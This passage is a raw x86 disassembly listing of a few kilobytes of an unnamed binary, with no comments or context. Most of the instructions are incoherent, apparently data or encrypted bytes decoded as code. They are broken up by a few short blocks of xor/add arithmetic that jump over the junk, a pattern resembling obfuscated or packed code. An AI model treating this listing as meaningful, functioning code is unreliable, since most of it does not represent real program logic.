  40af2e:	xor    DWORD PTR [edx-0x3d297a72],ebp
  40af34:	ror    ecx,cl
  40af36:	pop    ebp
  40af37:	retf   
  40af38:	mov    ecx,0x166d2376
  40af3d:	mov    ebp,0x4bdb99b4
  40af42:	mov    DWORD PTR [edx],0xdb2964d5
  40af48:	mov    ah,0xa6
  40af4a:	pushf  
  40af4b:	call   0x5a2b:0xcf60c844
  40af52:	pop    esp
  40af53:	fist   WORD PTR [eax]
  40af55:	fs xchg ecx,eax
  40af57:	outs   dx,DWORD PTR ds:[esi]
  40af58:	adc    DWORD PTR [eax+ebp*4+0x4e1da695],esi
  40af5f:	sub    DWORD PTR [eax-0x6e],eax
  40af62:	or     BYTE PTR [ebp*8-0x536ddee2],0x85
  40af6a:	mov    dl,0x30
  40af6c:	adc    BYTE PTR [ecx-0x1],ah
  40af6f:	mov    ah,0x6a
  40af71:	retf   
  40af72:	bnd call 0x80463f2e
  40af78:	inc    eax
  40af79:	mov    ebx,0xb25955db
  40af7e:	dec    ebp
  40af7f:	jp     0x40af4f
  40af81:	fdivr  QWORD PTR [ecx+0x0]
  40af84:	pusha  
  40af85:	mov    eax,ds:0xdd12ef4b
  40af8a:	xchg   esp,eax
  40af8b:	sub    dl,BYTE PTR ds:0x694364ee
  40af91:	jmp    0x40afb4
  40af93:	mov    edi,?
  40af95:	fwait
  40af96:	mov    dl,0xc
  40af98:	jle    0x40af83
  40af9a:	aad    0xf8
  40af9c:	pop    ds
  40af9d:	paddusw mm2,QWORD PTR [edx+0x2cfe52d6]
  40afa4:	enter  0x2a43,0xb6
  40afa8:	lock fsubr DWORD PTR [esp+edx*4-0x69]
  40afad:	(bad)  
  40afae:	repnz mov al,ds:0x8bc014c7
  40afb4:	cmp    ecx,eax
  40afb6:	hlt    
  40afb7:	xchg   edi,eax
  40afb8:	dec    esi
  40afb9:	ror    DWORD PTR [edx],1
  40afbb:	je     0x40b03b
  40afbd:	fcomi  st,st(6)
  40afbf:	dec    al
  40afc1:	adc    al,0xf8
  40afc3:	pop    edx
  40afc4:	stc    
  40afc5:	fild   QWORD PTR gs:[edi-0x26]
  40afc9:	ins    BYTE PTR es:[edi],dx
  40afca:	adc    eax,0x896f6ffb
  40afcf:	pop    ebp
  40afd0:	hlt    
  40afd1:	mov    eax,DWORD PTR [eax]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     bl,BYTE PTR [eax+ebp*2-0x17867f10]
  40affd:	jle    0x40b07d
  40afff:	cs jge 0x40b080
  40b002:	jle    0x40b04f
  40b004:	push   eax
  40b005:	add    BYTE PTR [ebp+ebx*8+0x40a15d71],0x8
  40b00d:	popf   
  40b00e:	dec    ebp
  40b00f:	outs   dx,BYTE PTR ds:[esi]
  40b010:	lea    ecx,[edx-0x518df388]
  40b016:	repz add DWORD PTR [esp+ecx*4-0x43],edx
  40b01b:	push   edi
  40b01c:	or     al,0x26
  40b01e:	cmc    
  40b01f:	adc    edi,DWORD PTR [esi-0x76cd0f35]
  40b025:	pop    edx
  40b026:	pushf  
  40b027:	fld    DWORD PTR [ebp+0xf5f9a7a]
  40b02d:	out    dx,eax
  40b02e:	sub    esp,edx
  40b030:	je     0x40afff
  40b032:	mov    eax,ds:0xdca1ba1b
  40b037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b038:	adc    al,0x17
  40b03a:	imul   edi,DWORD PTR [ebp+ecx*4-0x1e],0xffffffbb
  40b03f:	push   ecx
  40b040:	xor    dl,BYTE PTR [ebx]
  40b042:	fwait
  40b043:	cld    
  40b044:	or     ebx,DWORD PTR [ecx+0x35]
  40b047:	iret   
  40b048:	int    0xe9
  40b04a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b04b:	xchg   ecx,eax
  40b04c:	xlat   BYTE PTR ds:[ebx]
  40b04d:	repnz popf 
  40b04f:	xor    al,0xd6
  40b051:	adc    DWORD PTR [ebp+ebx*2-0x5c28eb83],esp
  40b058:	stos   BYTE PTR es:[edi],al
  40b059:	inc    ebp
  40b05a:	cmp    cl,BYTE PTR [ebx]
  40b05c:	fucomi st,st(7)
  40b05e:	mov    WORD PTR [esp+edi*8-0xe],cs
  40b062:	xchg   edi,eax
  40b063:	jecxz  0x40b043
  40b065:	xchg   DWORD PTR [ecx-0x37],edx
  40b068:	mov    esi,0xfc864f
  40b06d:	das    
  40b06e:	add    BYTE PTR [edi-0x67db4b1f],0x19
  40b075:	adc    al,0x79
  40b077:	pop    ebx
  40b078:	mov    DWORD PTR [ebx],ecx
  40b07a:	out    dx,eax
  40b07b:	adc    bl,BYTE PTR [eax-0x6a]
  40b07e:	stos   BYTE PTR es:[edi],al
  40b07f:	sub    eax,0x75a5597e
  40b084:	xor    dh,BYTE PTR [esp+esi*4+0x17d46ff]
  40b08b:	nop
  40b08c:	enter  0xa7ef,0x74
  40b090:	push   0x43fce7b3
  40b095:	adc    BYTE PTR [ebx+ebx*8-0x10],ah
  40b099:	in     al,dx
  40b09a:	enter  0x806e,0xc5
  40b09e:	repz call 0x2af94e72
  40b0a4:	pop    ebp
  40b0a5:	outs   dx,DWORD PTR ds:[esi]
  40b0a6:	sub    al,0x95
  40b0a8:	pop    ss
  40b0a9:	fbstp  TBYTE PTR ds:0xa862dccf
  40b0af:	push   0x953c558f
  40b0b4:	mov    dh,0xdf
  40b0b6:	mov    cl,dl
  40b0b8:	sub    BYTE PTR [ebp-0x284f7644],dl
  40b0be:	pop    ss
  40b0bf:	in     eax,0x46
  40b0c1:	js     0x40b072
  40b0c3:	hlt    
  40b0c4:	idiv   BYTE PTR [ebx-0x6e]
  40b0c7:	and    al,0xc8
  40b0c9:	iret   
  40b0ca:	mov    esp,0x6a848965
  40b0cf:	dec    esp
  40b0d0:	shl    DWORD PTR [ecx],1
  40b0d2:	rol    DWORD PTR [eax+0x3649ea8f],0xca
  40b0d9:	retf   
  40b0da:	fild   QWORD PTR [edx+0x2e]
  40b0dd:	push   esp
  40b0de:	jmp    0x5992:0x6ee4f5ce
  40b0e5:	inc    eax
  40b0e6:	adc    eax,ecx
  40b0e8:	aam    0x49
  40b0ea:	xor    ah,BYTE PTR [eax]
  40b0ec:	mov    cl,0x7b
  40b0ee:	mov    al,ds:0x98c8c411
  40b0f3:	adc    bx,dx
  40b0f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f7:	stc    
  40b0f8:	vpcomuw xmm15,xmm0,XMMWORD PTR [edx],0xa5
  40b0fe:	sbb    ebx,eax
  40b100:	sbb    ah,BYTE PTR [ebx]
  40b102:	sahf   
  40b103:	dec    esp
  40b104:	mov    dl,0x49
  40b106:	dec    ebp
  40b107:	out    dx,al
  40b108:	das    
  40b109:	sti    
  40b10a:	xor    DWORD PTR [eax+0x5d105b57],0xfffffffc
  40b111:	fs (bad) 
  40b113:	jbe    0x40b095
  40b115:	mov    ah,0x89
  40b117:	xchg   BYTE PTR [ebp+0x57],dl
  40b11a:	enter  0x3e92,0x93
  40b11e:	loop   0x40b175
  40b120:	pop    ss
  40b121:	aas    
  40b122:	mov    ds:0x269bb425,eax
  40b127:	jl     0x40b0e7
  40b129:	popa   
  40b12a:	sbb    cl,dl
  40b12c:	xor    ch,BYTE PTR [ebp+0x7fb875ec]
  40b132:	mov    cl,0x85
  40b134:	loop   0x40b128
  40b136:	repz test BYTE PTR gs:[ecx+0x399f2c46],0x5
  40b13f:	call   0xf7bee8b5
  40b144:	mov    dl,0x63
  40b146:	and    eax,0xb855456e
  40b14b:	cmp    DWORD PTR [ebp+0x20],esp
  40b14e:	jae    0x40b1af
  40b150:	jnp    0x40b177
  40b152:	push   esi
  40b153:	mov    ebx,0xfb1416c7
  40b158:	mov    ebp,0x3459f62e
  40b15d:	adc    dl,BYTE PTR [eax-0x4]
  40b160:	mov    esi,0xb38fba83
  40b165:	xchg   edi,eax
  40b166:	es cs (bad) 
  40b169:	inc    eax
  40b16a:	inc    eax
  40b16b:	les    ecx,FWORD PTR ds:0x8afb6929
  40b171:	push   esp
  40b172:	cmp    eax,0xd623aff9
  40b177:	dec    esp
  40b178:	mov    eax,ds:0x5c2d60c5
  40b17d:	push   ebp
  40b17e:	repnz dec edx
  40b180:	mov    al,ds:0x72af67f7
  40b185:	fdivr  DWORD PTR [esi]
  40b187:	aas    
  40b188:	adc    DWORD PTR [ecx+0x7a],ecx
  40b18b:	mov    dh,0xdb
  40b18d:	mov    edx,0xa2b62783
  40b192:	aas    
  40b193:	pop    es
  40b194:	call   0xd51a:0xd6a7e43d
  40b19b:	enter  0xe69a,0x1a
  40b19f:	aas    
  40b1a0:	stc    
  40b1a1:	and    eax,0x344fe76e
  40b1a6:	mov    esp,0xfa9c1b09
  40b1ab:	mov    ecx,0x24e1d7f3
  40b1b0:	sub    esp,DWORD PTR [ecx+0x40]
  40b1b3:	jno    0x40b158
  40b1b5:	sbb    cl,ah
  40b1b7:	adc    eax,0x2ff0c216
  40b1bc:	xchg   ebx,eax
  40b1bd:	jle    0x40b17c
  40b1bf:	pop    ebx
  40b1c0:	repz mov bl,0x7f
  40b1c3:	clc    
  40b1c4:	adc    DWORD PTR [eax],esp
  40b1c6:	adc    ebp,DWORD PTR [edi]
  40b1c8:	xchg   BYTE PTR [eax],ah
  40b1ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1cb:	push   cs
  40b1cc:	(bad)  
  40b1cd:	into   
  40b1ce:	enter  0x1a76,0x9
  40b1d2:	cwde   
  40b1d3:	or     al,0x37
  40b1d5:	(bad)  
  40b1d6:	adc    al,0xae
  40b1d8:	leave  
  40b1d9:	xchg   ebx,eax
  40b1da:	add    cl,bl
  40b1dc:	inc    ecx
  40b1dd:	pop    edi
  40b1de:	popa   
  40b1df:	sub    edx,edi
  40b1e1:	adc    DWORD PTR [esi],edi
  40b1e3:	pop    ds
  40b1e4:	test   eax,0xcacdf919
  40b1e9:	mov    ecx,0xcb05d91a
  40b1ee:	gs ret 
  40b1f0:	push   0x292be8f7
  40b1f5:	or     ah,BYTE PTR [eax+0xc]
  40b1f8:	pop    es
  40b1f9:	lea    ebx,ds:0x43a403ce
  40b1ff:	mov    WORD PTR [edx-0x63341dff],ss
  40b205:	pop    ss
  40b206:	or     ecx,DWORD PTR [esi-0x70dfc822]
  40b20c:	pop    eax
  40b20d:	ret    
  40b20e:	in     al,0x63
  40b210:	xchg   ecx,eax
  40b211:	leave  
  40b212:	inc    edx
  40b213:	cs xor eax,0x90fa8f50
  40b219:	mov    ch,0x51
  40b21b:	fdiv   QWORD PTR [ebx-0x5bef9b19]
  40b221:	pop    ebx
  40b222:	push   esi
  40b223:	jns    0x40b1b4
  40b225:	or     al,0x15
  40b227:	test   BYTE PTR [edi],ah
  40b229:	jmp    0x99a5:0x778ec7b7
  40b230:	adc    DWORD PTR [esi],ebx
  40b232:	retf   0x73f5
  40b235:	dec    BYTE PTR [eax+0x7a]
  40b238:	and    eax,0xa5eed39f
  40b23d:	outs   dx,DWORD PTR ds:[esi]
  40b23e:	fisub  WORD PTR [edi+0xf]
  40b241:	cld    
  40b242:	push   0xb0050c93
  40b247:	imul   edi,DWORD PTR [eax+0x5d3b014f],0x62af8a90
  40b251:	and    al,0xc
  40b253:	xor    al,0xb6
  40b255:	xchg   edx,esi
  40b257:	cmp    BYTE PTR [eax-0xc926930],al
  40b25d:	(bad)  
  40b25e:	push   edi
  40b25f:	push   cs
  40b260:	or     dh,BYTE PTR [eax-0x47]
  40b263:	xor    ebp,DWORD PTR [esi]
  40b265:	rcl    DWORD PTR [ecx-0x54003290],1
  40b26b:	mov    ecx,DWORD PTR [edx+0x14761f1a]
  40b271:	nop
  40b272:	stos   DWORD PTR es:[edi],eax
  40b273:	xchg   edx,eax
  40b274:	pop    ss
  40b275:	push   edx
  40b276:	xchg   edx,eax
  40b277:	fcom   QWORD PTR [esi]
  40b279:	es cdq 
  40b27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27c:	jb     0x40b227
  40b27e:	pop    edi
  40b27f:	jmp    0x5116:0x1e4dac1a
  40b286:	ins    DWORD PTR es:[edi],dx
  40b287:	hlt    
  40b288:	dec    esi
  40b289:	cs jnp 0x40b288
  40b28c:	loop   0x40b28f
  40b28e:	xor    bl,BYTE PTR [esi-0x6cf23b18]
  40b294:	adc    eax,edi
  40b296:	jo     0x40b22d
  40b298:	push   ecx
  40b299:	push   ss
  40b29a:	dec    DWORD PTR [esi-0x2c]
  40b29d:	retf   0x8928
  40b2a0:	das    
  40b2a1:	out    0xf1,al
  40b2a3:	cmp    edx,esi
  40b2a5:	inc    esp
  40b2a6:	shl    DWORD PTR [eax+ebp*4+0x2061c1dc],0x51
  40b2ae:	push   esp
  40b2af:	mov    al,ds:0x86767ec9
  40b2b4:	and    DWORD PTR [eax-0x637aa1b2],ecx
  40b2ba:	adc    eax,0x725616aa
  40b2bf:	mov    ds:0xa287392e,eax
  40b2c4:	int3   
  40b2c5:	mov    esi,0xfd9e50cd
  40b2ca:	(bad)  
  40b2cb:	jae    0x40b2a8
  40b2cd:	mov    eax,ds:0x7c416b58
  40b2d2:	push   ss
  40b2d3:	jb     0x40b34a
  40b2d5:	int    0x90
  40b2d7:	xchg   edi,eax
  40b2d8:	jne    0x40b2c1
  40b2da:	shl    BYTE PTR [ebx+0x6df13193],cl
  40b2e0:	sti    
  40b2e1:	cld    
  40b2e2:	sbb    eax,0x19c72943
  40b2e7:	push   ecx
  40b2e8:	xor    BYTE PTR [ebp+0x65],bl
  40b2eb:	xor    DWORD PTR [eax],0xffffffb8
  40b2ee:	xor    DWORD PTR [eax-0x2e],esi
  40b2f1:	mov    ds:0x28cf1896,eax
  40b2f6:	cmp    bh,BYTE PTR [edi+0x445aebaa]
  40b2fc:	xor    al,0x6b
  40b2ff:	mov    ds:0x32749e86,al
  40b304:	out    0x9,eax
  40b306:	push   eax
  40b307:	addr16 cli 
  40b309:	push   edi
  40b30a:	push   ebx
  40b30b:	shl    DWORD PTR [ebx],1
  40b30d:	mov    ds:0xc86cf7da,eax
  40b312:	stc    
  40b313:	in     al,dx
  40b314:	sub    al,0x78
  40b316:	mov    al,BYTE PTR [ecx]
  40b318:	lea    ebp,[ebx-0x6e70f316]
  40b31e:	out    dx,eax
  40b31f:	cmp    DWORD PTR [ebp+0x665bb020],edi
  40b325:	mov    fs,esi
  40b327:	mov    DWORD PTR [ebp+ebp*2-0x38],ecx
  40b32b:	jnp    0x40b32a
  40b32d:	jae    0x40b31f
  40b32f:	xor    al,0xfa
  40b331:	dec    edi
  40b332:	icebp  
  40b333:	mov    eax,DWORD PTR [ebp+0x8]
  40b336:	mov    ecx,DWORD PTR [ebp-0x8]
  40b339:	xor    eax,esi
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	and    esp,ebp
  40b376:	cmp    ebx,ebx
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b359
  40b381:	mov    DWORD PTR [ecx+eiz*2],esp
  40b384:	or     eax,0x39ce9b0d
  40b389:	and    al,0xb
  40b38b:	inc    edx
  40b38c:	mov    esp,0x9e0f701d
  40b391:	ja     0x40b37e
  40b393:	jno    0x40b3c0
  40b395:	mov    ebp,0xa4542fb9
  40b39a:	ins    BYTE PTR es:[edi],dx
  40b39b:	lods   eax,DWORD PTR ds:[esi]
  40b39c:	or     DWORD PTR [edi+ebx*1],0xffffffaa
  40b3a0:	mov    ah,0x2c
  40b3a2:	pop    edi
  40b3a3:	jmp    0x8b70:0xd3af01cd
  40b3aa:	inc    ebx
  40b3ab:	fmul   DWORD PTR [edi]
  40b3ad:	sbb    al,0xff
  40b3af:	and    al,0xbd
  40b3b1:	mov    bh,0x3f
  40b3b3:	mov    dl,0xf0
  40b3b5:	jno    0x40b36c
  40b3b7:	in     al,0x75
  40b3b9:	dec    ecx
  40b3ba:	rol    BYTE PTR [edx],cl
  40b3bc:	(bad)
  40b3bf:	scas   al,BYTE PTR es:[edi]
  40b3c0:	enter  0x9ae9,0xa1
  40b3c4:	shr    ebp,0xfd
  40b3c7:	not    DWORD PTR ds:[ebx+edx*8+0x5f]
  40b3cc:	sti    
  40b3cd:	and    dl,ch
  40b3cf:	lock mov bh,0x43
  40b3d2:	fsubrp st(0),st
  40b3d4:	sbb    BYTE PTR [edi+0x7f],ch
  40b3d7:	out    dx,eax
  40b3d8:	dec    ebx
  40b3d9:	inc    edx
  40b3da:	(bad)  
  40b3db:	ss addr16 test al,0x14
  40b3df:	dec    edx
  40b3e0:	cwde   
  40b3e1:	pusha  
  40b3e2:	popa   
  40b3e3:	icebp  
  40b3e4:	dec    eax
  40b3e5:	mul    BYTE PTR [ecx-0x6a]
  40b3e8:	lock cmp edi,esi
  40b3eb:	xlat   BYTE PTR ds:[ebx]
  40b3ec:	xchg   ebp,eax
  40b3ed:	sub    BYTE PTR [edx],cl
  40b3ef:	test   eax,0x3e95df95
  40b3f4:	pop    ds
  40b3f5:	cwde   
  40b3f6:	fst    DWORD PTR [edi+0x2b60eadd]
  40b3fc:	iret   
  40b3fd:	adc    DWORD PTR [edi+0x28fa5f03],ebp
  40b403:	lods   al,BYTE PTR ds:[esi]
  40b404:	call   0x869f3d96
  40b409:	add    BYTE PTR [edx+ecx*2-0x4845e089],dh
  40b410:	in     al,dx
  40b411:	out    0x86,al
  40b413:	ds dec ebx
  40b415:	test   al,0xa5
  40b417:	xchg   esi,eax
  40b418:	int3   
  40b419:	retf   0x9e72
  40b41c:	sar    BYTE PTR [edi+0x4a],1
  40b41f:	xchg   esp,edi
  40b421:	(bad)  
  40b422:	mov    al,0x1d
  40b424:	push   edi
  40b425:	sti    
  40b426:	cmp    BYTE PTR [ecx-0x4c0d87d2],dl
  40b42c:	out    dx,al
  40b42d:	sahf   
  40b42e:	std    
  40b42f:	mov    dh,0x85
  40b431:	(bad)  
  40b432:	and    bl,cl
  40b434:	retf   0x539a
  40b437:	aaa    
  40b438:	or     al,0x52
  40b43a:	push   ebp
  40b43b:	jl     0x40b441
  40b43d:	mov    eax,0x86c1f305
  40b442:	jp     0x40b40f
  40b444:	or     eax,0x23600f58
  40b449:	cwde   
  40b44a:	jbe    0x40b41f
  40b44c:	repz imul edx,DWORD PTR [edx-0x47561c5],0x1e
  40b454:	popa   
  40b455:	retf   
  40b456:	inc    edx
  40b457:	(bad)
  40b45b:	and    BYTE PTR [edx-0x2f],0xa4
  40b45f:	and    bh,BYTE PTR [edi]
  40b461:	fs jne 0x40b3f2
  40b464:	jo     0x40b47d
  40b466:	inc    eax
  40b467:	inc    ebx
  40b469:	xchg   DWORD PTR [edx+esi*4-0x25],ecx
  40b46d:	je     0x40b4b8
  40b46f:	pop    es
  40b470:	les    edx,FWORD PTR [eax-0x56f75922]
  40b476:	sub    al,0x86
  40b478:	in     eax,0xbd
  40b47a:	inc    ebp
  40b47b:	or     eax,0xd50d970b
  40b480:	in     al,0x4d
  40b482:	jo     0x40b4bd
  40b484:	sbb    BYTE PTR [ecx-0x16],0x8c
  40b488:	xor    BYTE PTR [edi+0x42],bl
  40b48b:	push   edx
  40b48c:	jnp    0x40b461
  40b48e:	mul    DWORD PTR [esi+0x1f2caee7]
  40b494:	jle    0x40b4a1
  40b496:	add    eax,0x6479c036
  40b49b:	inc    ebp
  40b49c:	inc    ebp
  40b49d:	cmc    
  40b49e:	push   cs
  40b49f:	inc    edx
  40b4a0:	aad    0xa3
  40b4a2:	cmp    eax,0x3ade51d3
  40b4a7:	sbb    eax,0x82d3b1a9
  40b4ac:	mov    ds:0xa3aae1bb,eax
  40b4b1:	out    dx,al
  40b4b2:	out    dx,eax
  40b4b3:	jge    0x40b4da
  40b4b5:	arpl   WORD PTR [eax+ecx*8],bp
  40b4b8:	bound  esp,QWORD PTR [edx-0x67]
  40b4bb:	and    DWORD PTR [ebx],edx
  40b4bd:	xor    eax,0xd478f011
  40b4c2:	dec    ecx
  40b4c3:	cwde   
  40b4c4:	mov    eax,ds:0xa01f24f5
  40b4c9:	inc    ecx
  40b4ca:	jg     0x40b495
  40b4cc:	xor    BYTE PTR [ebx+0x4],ah
  40b4cf:	lock xchg edi,eax
  40b4d1:	cmp    bh,BYTE PTR ds:0xf1d5f7d3
  40b4d7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4d9:	(bad)  
  40b4da:	aaa    
  40b4db:	fisub  WORD PTR [ebx+ebx*8-0x1f]
  40b4df:	cmc    
  40b4e0:	inc    eax
  40b4e1:	mov    eax,ds:0x15733f85
  40b4e6:	xor    DWORD PTR [edi+0xaa76f60],eax
  40b4ec:	inc    eax
  40b4ed:	bswap  esi
  40b4ef:	inc    eax
  40b4f0:	jge    0x40b484
  40b4f2:	mov    ecx,0xecdfe404
  40b4f7:	adc    DWORD PTR [ecx-0x6c],edx
  40b4fa:	fwait
  40b4fb:	stos   BYTE PTR es:[edi],al
  40b4fc:	cli    
  40b4fd:	jp     0x40b4eb
  40b4ff:	ss scas al,BYTE PTR es:[edi]
  40b501:	add    dl,dl
  40b503:	repz mov al,ds:0x6362f2d3
  40b509:	ret    
  40b50a:	jae    0x40b53c
  40b50c:	push   ds
  40b50d:	fistp  WORD PTR [esi]
  40b50f:	inc    eax
  40b510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b511:	and    al,0xb6
  40b513:	and    ch,dl
  40b515:	pop    edx
  40b516:	clc    
  40b517:	js     0x40b543
  40b519:	mul    DWORD PTR [edx-0x45]
  40b51c:	repz cmp al,BYTE PTR [ecx+0x5e]
  40b520:	push   eax
  40b521:	mov    bh,BYTE PTR [edx+0x41]
  40b524:	add    al,BYTE PTR [edi+0x489e6bcc]
  40b52a:	(bad)  
  40b52b:	jle    0x40b56b
  40b52d:	cwde   
  40b52e:	adc    BYTE PTR [eax+0x16],cl
  40b531:	ja     0x40b4e1
  40b533:	mov    al,ds:0xb153aa92
  40b538:	loope  0x40b52a
  40b53a:	retf   
  40b53b:	jmp    0x40b4e2
  40b53d:	or     ah,BYTE PTR [ebx]
  40b53f:	push   esp
  40b541:	retf   0x1fa4
  40b544:	cdq    
  40b545:	add    ebx,DWORD PTR [ebx]
  40b547:	xor    al,0x76
  40b549:	inc    edi
  40b54a:	enter  0x4c2,0x76
  40b54e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b54f:	sub    BYTE PTR [edx+0x3c808502],dl
  40b555:	xchg   esi,eax
  40b556:	push   ebp
  40b557:	push   0x43d9b8ad
  40b55c:	das    
  40b55d:	sbb    DWORD PTR [edx],ecx
  40b55f:	sar    BYTE PTR [esp+esi*4],1
  40b562:	cmp    DWORD PTR [ebx-0x526f54d6],esi
  40b568:	in     al,dx
  40b569:	sub    DWORD PTR [edx+ebx*8-0x23],0xc44773a7
  40b571:	fist   WORD PTR [edi+0x325d3ada]
  40b577:	lahf   
  40b578:	int3   
  40b579:	inc    edx
  40b57a:	jb     0x40b513
  40b57c:	jbe    0x40b5b9
  40b57e:	call   0xebec994c
  40b583:	add    al,0xc2
  40b586:	jae    0x40b543
  40b588:	mov    DWORD PTR [edx+esi*4],eax
  40b58b:	bound  ebp,QWORD PTR [edx]
  40b58d:	outs   dx,BYTE PTR ds:[esi]
  40b58e:	pop    edx
  40b58f:	(bad)  
  40b590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b591:	rcr    DWORD PTR [eax],0xeb
  40b594:	add    al,0xfd
  40b596:	sbb    eax,0xb6eb7f9c
  40b59b:	mov    edi,DWORD PTR [ebx+0x12057bca]
  40b5a1:	addr16 xchg esi,eax
  40b5a3:	xor    al,0x3e
  40b5a5:	dec    edx
  40b5a6:	ret    
  40b5a7:	sub    eax,0xe9aab1b6
  40b5ac:	inc    eax
  40b5ad:	mov    DWORD PTR [esi-0x49078b36],esp
  40b5b3:	push   0x8c86b580
  40b5b8:	int3   
  40b5b9:	aad    0xef
  40b5bb:	lds    edx,FWORD PTR [eax]
  40b5bd:	loopne 0x40b56a
  40b5bf:	adc    DWORD PTR [ebx-0x63],edi
  40b5c2:	add    bl,BYTE PTR [eax+edx*1+0x54]
  40b5c6:	mov    ebx,0xf26b3175
  40b5cb:	and    ah,BYTE PTR ds:0x47f9ac21
  40b5d1:	dec    esi
  40b5d2:	jae    0x40b5e1
  40b5d4:	jbe    0x40b603
  40b5d6:	push   ds
  40b5d7:	in     eax,0x8
  40b5d9:	xchg   esi,eax
  40b5da:	sub    DWORD PTR [edi],eax
  40b5dc:	xor    al,0x1
  40b5de:	inc    edx
  40b5df:	xor    al,0xe4
  40b5e2:	xor    bl,ah
  40b5e4:	loop   0x40b637
  40b5e6:	ror    BYTE PTR [ebx+0x530ef733],1
  40b5ec:	hlt    
  40b5ed:	sub    esi,0xb47a62a
  40b5f3:	push   es
  40b5f4:	pop    ss
  40b5f5:	mov    bl,0xd2
  40b5f7:	ret    
  40b5f8:	jp     0x40b5de
  40b5fa:	(bad)  
  40b5fb:	jo     0x40b5be
  40b5fd:	pop    eax
  40b5fe:	(bad)  
  40b5ff:	in     eax,dx
  40b600:	sti    
  40b601:	(bad)  
  40b603:	jmp    0xaf31:0x871b0584
  40b60a:	or     ebx,DWORD PTR [ecx-0x3a113819]
  40b610:	inc    esp
  40b611:	or     DWORD PTR [ecx+0x5ce3bb28],esp
  40b617:	push   edx
  40b618:	or     al,0xa6
  40b61a:	(bad)  
  40b61b:	cli    
  40b61c:	jmp    0x40b5e1
  40b61e:	mov    bl,0xdd
  40b620:	out    dx,al
  40b621:	adc    BYTE PTR [esi+0x1d],bh
  40b624:	je     0x40b62a
  40b626:	rcl    BYTE PTR [esi-0x3a],cl
  40b629:	jle    0x40b66e
  40b62b:	adc    BYTE PTR [ecx-0x77562cd],al
  40b631:	pop    edi
  40b632:	iret   
  40b633:	push   ds
  40b634:	add    al,0x40
  40b636:	mov    dl,0x3f
  40b638:	adc    al,0x79
  40b63a:	ret    0x7f8f
  40b63d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b63e:	test   BYTE PTR [ebx+ebp*2-0x14e0ccf7],al
  40b645:	and    DWORD PTR [edi],ebp
  40b647:	fistp  QWORD PTR [ebp-0x52356f]
  40b64d:	adc    esi,esp
  40b64f:	mov    al,ds:0x77f57e72
  40b654:	fimul  WORD PTR [edx+0x6b12ea86]
  40b65a:	sub    eax,0xa520bdab
  40b65f:	mov    ds:0x7c19c570,al
  40b664:	retf   0x76bf
  40b667:	add    eax,DWORD PTR [eax+0x6b]
  40b66a:	xor    esi,esi
  40b66c:	cmp    DWORD PTR [ecx+0x4214b94c],edx
  40b672:	mov    edx,0x9222407a
  40b677:	aam    0x6b
  40b679:	and    bl,BYTE PTR [edx-0x2ff8e1e5]
  40b67f:	cwde   
  40b680:	sub    eax,0x74096399
  40b685:	push   edi
  40b686:	fiadd  DWORD PTR [ebx]
  40b688:	(bad)  
  40b689:	mov    esi,0x661f627b
  40b68e:	mov    edi,0x6657c58e
  40b693:	push   cs
  40b694:	ins    DWORD PTR es:[edi],dx
  40b695:	scas   al,BYTE PTR es:[edi]
  40b696:	cmp    BYTE PTR [edi-0x6b566914],cl
  40b69c:	pop    eax
  40b69d:	inc    eax
  40b69e:	dec    esi
  40b69f:	(bad)  
  40b6a0:	cli    
  40b6a1:	(bad)  
  40b6a2:	in     eax,dx
  40b6a3:	xlat   BYTE PTR ds:[ebx]
  40b6a4:	mov    ebx,0x2bf3d265
  40b6a9:	dec    edx
  40b6aa:	ins    BYTE PTR es:[edi],dx
  40b6ab:	adc    BYTE PTR [eax],0xdc
  40b6ae:	dec    edi
  40b6af:	out    dx,al
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x97
  40b6da:	xchg   eax,eax
  40b6dc:	icebp  
  40b6dd:	fptan  
  40b6df:	jle    0x40b75f
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b6ee
  40b6e6:	bnd jl 0x40b730
